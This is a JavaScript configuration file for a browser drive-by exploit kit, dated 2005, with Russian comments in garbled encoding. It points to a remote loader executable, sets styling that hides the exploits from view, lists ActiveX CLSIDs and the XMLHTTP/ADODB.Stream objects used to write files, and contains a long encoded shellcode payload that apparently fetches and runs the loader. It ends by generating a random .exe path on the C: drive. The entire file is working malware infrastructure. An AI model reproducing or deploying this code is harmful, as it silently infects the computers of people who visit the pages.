/* author: xoce */
/* Creation date: 26.02.2005 */
/* ѕеременные дл€ всех сплойтов, данный js скрипт должен быть включен во все страницы, без него ничего работать не будет */

/* Java конфиг */ 
var UrlPath="http://pillz.info/web.exe"; /* путь до вашего загрузчика */
var Url="http://pillz.info/js/"; /* путь до вашего загрузчика */
var ExeFile="web.exe"; /* файл загрузчика, наход€щийс€ в корне дериктории, где лежит файл conf.js */
var tagstyle='style="display:none"'; /* невидимость сплойтов дл€ глаза */
var ObjCLSID="clsid:72967901-68EC-1109-B729-00AA0062CBB7"; /* CLSID, можно манипулировать, подставл€€ разные значени€ */
var ObjCLSID2="clsid:7BD29E00-76C1-11CF-9DD0-00A0C9034933"; /* CLSID, можно манипулировать, подставл€€ разные значени€ */
var MXML="Microsoft.XMLHTTP"; /* Microsoft.XMLHTTP*/
var ADSt="ADODB.Stream"; /* ADODB.Stream */
var CAB="web.cab";
/* Hta эксплойт (файл in.hta)*/
/* ≈сли вы будете измен€ть название загрузчика на свое, то не забудьте изменить в этом файле путь до него и само название*/
var xp= unescape("%u3737%u3737" +
   "%u0feb%u8058%u9930%u8140%u6838%u6361%u756b%uebf4%ue805%uffec" +
   "%uffff%u6970%u9999%uc199%u10cc%u187c%ub575%u9999%u1099%u4ddc" +
   "%udc5e%u9965%u7f99%u12ee%u65dc%u18ff%ud4a1%uecc3%u9ce5%u99a5" +
   "%u9999%u8112%uc49a%uff65%ua218%udcc9%uf2ec%u5a18%u99e1%u9999" +
   "%uaa12%uec9a%u1865%u815f%u9999%u3499%udc10%u346d%udc9a%u1065" +
   "%u69dc%u9a34%u65dc%udc10%u3475%udc9a%u1065%u71dc%u66a8%udc12" +
   "%u9c4d%u9996%u9999%udc10%u5e45%u41dc%u9994%u9999%ub471%u9999" +
   "%u1299%u45cc%ucc10%u1279%u4ddc%udc10%u5e45%u41dc%u9996%u9999" +
   "%u8c71%u9999%u1299%u45cc%ucc10%u127d%u79dc%u4a10%uee70%u9999" +
   "%u7099%u996f%u9999%u59a8%udc10%u1261%u61e4%ue4a2%ue46d%udeda" +
   "%ue410%ua861%u1259%u61dc%u7958%u129b%u75c4%u5a98%u9a12%udc9a" +
   "%u1065%u125e%u45ec%ud412%u6a41%uec3f%ua84f%u1259%u61dc%u7948" +
   "%uc412%u9871%ua85a%uff59%u9a12%u7958%u129b%u69c4%u4198%u8112" +
   "%uc49a%u1065%u45c4%u715a%u6692%u6666%ufcde%uc9ed%uf6eb%ud8fa" +
   "%ufdfd%ufceb%ueaea%ud599%uf8f6%ud5fd%ufbf0%uf8eb%ue0eb%u99d8" +
   "%u1b70%u9999%uc699%u10cc%u187c%u8575%u9999%u1099%u71dc%uc410" +
   "%u107d%u65e4%udc5e%u9f75%u9999%u1299%u65dc%udc10%u9c6d%u99df" +
   "%u9999%udc10%u7169%u99be%u9999%udc5e%u9a75%u9999%u1299%u65dc" +
   "%ud59c%u9999%u1099%u6ddc%ua59c%u9999%u1099%u69dc%u9171%u9999" +
   "%u1299%u65dc%u5270%u9999%u1299%u6ddc%u66c9%u71cc%u591c%ub9ed" +
   "%udc10%u1261%u69ec%ud412%u1275%u6dc4%u59a8%u9835%u125a%u61dc" +
   "%ucaf9%u66c9%u7dcc%u9a10%u7bf8%u5a73%u7209%u7164%u66e0%u6666" +
   "%ufcf2%uf7eb%uf5fc%uabaa%ufdb7%uf5f5%ucf99%uebf0%ueced%uf5f8" +
   "%uf5d8%uf6f5%u99fa%uf5c6%uebfa%uf8fc%u99ed%uf5c6%uebee%uedf0" +
   "%u99fc%uf5c6%uf5fa%ueaf6%u99fc%uf0ce%udcf7%ufce1%u99fa%ue1dc" +
   "%uedf0%uebc9%ufaf6%ueafc%u99ea%u8394%ub3bb%ua3ab%uf0ee%uf0f7" +
   "%ufcf7%ub7ed%uf5fd%u99f5%uf7d0%ufced%uf7eb%uedfc%ue9d6%uf7fc" +
   "%u99d8%uf7d0%ufced%uf7eb%uedfc%ue9d6%uf7fc%uebcc%ud8f5%ud099" +
   "%uedf7%uebfc%ufcf7%ucbed%uf8fc%udffd%uf5f0%u99fc%u8395%u09b2" +
   "%u59a8%u12c9%uc017%u9999%u6699%ua3c8%u7070%u9999%uc799%u1f10" +
   "%u99c0%u9999%u9df1%u9999%uf199%u8999%u9999%u06f1%u981f%uf199" +
   "%u9999%u9999%u1712%u99c0%u9999%uc866%u1094%u991f%u9999%ua899" +
   "%uc959%uc9c9%uc9c9%u1712%u99c0%u9999%uc866%u10c1%u9d1f%u9999" +
   "%ua899%uc959%uc9c9%u14c9%u911f%u9999%uc999%u1f12%u999d%u9999" +
   "%u12c9%uc017%u9999%u6699%uffc8%u1f10%u999d%u9999%u1f14%u99c8" +
   "%u9999%uf1c9%u1f06%u9998%u1f12%u9999%u9999%u12c9%u9d1f%u9999" +
   "%uc999%u1712%u99c0%u9999%uc866%uf1ee%u9999%u9999%u1f14%u99d1" +
   "%u9999%u12c9%uc017%u9999%u6699%u83c8%u1f10%u99cc%u9999%u1f12" +
   "%u99c8%u9999%u12c9%u991f%u9999%uc999%u1f12%u99cc%u9999%u12c9" +
   "%uc017%u9999%u6699%ubbc8%u1f12%u99cc%u9999%u12c9%uc017%u9999" +
   "%u6699%ub3c8%u9cf1%u9999%u1499%ud11f%u9999%uc999%u1712%u99c0" +
   "%u9999%uc866%u70ab%u669f%u6666%u8b71%u6666%u9966%u9999%u9999" +
   "%u9999%uf199%ueded%ua3e9%ub6b6%uf0e9%uf5f5%ub7e3%uf7f0%uf6ff" +
   "%uedb6%ufcb7%ufce1%u9999%u9999%u9999%u9999%u9999%u9999%u9999" +
   "%u9999%u9999%u9999%u9999%u9999%u9999%u9999%u9999%u9999%u9999" +
   "%u9999%u9999%u9999%ued99%ueafc%ub7ed%ue1fc%u99fc%u9999%u9999" +
   "%u9999%u9999%u9999%u9999%u6809%u6361%ucd6b");

/* генерирование уникального имени загружаемого файла */
ObjExe="";
   
   for (ik=0;ik<8;ik++)
   {
       ii=Math.random();
       chCode=Math.round(ii*25)+0x61;
       chSym=String.fromCharCode(chCode)
       ObjExe=ObjExe+chSym;
       if (chCode==0x61) {break};
   }
ObjExe="C:\\"+ObjExe+".exe";
